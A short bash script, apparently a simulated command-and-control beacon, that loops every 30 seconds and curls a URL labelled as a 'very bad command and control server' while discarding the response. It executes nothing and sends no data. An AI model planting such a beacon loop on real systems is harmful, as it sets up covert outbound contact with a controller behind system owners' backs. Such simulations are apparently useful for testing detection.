#!/bin/bash

sleep 10

while true
do
    echo "Requesting new instructions from C&C server..."
    curl https://www.berge.priv.at/my_very_bad_command_and_control_server.php 2>&1 >/dev/null
    sleep 30
done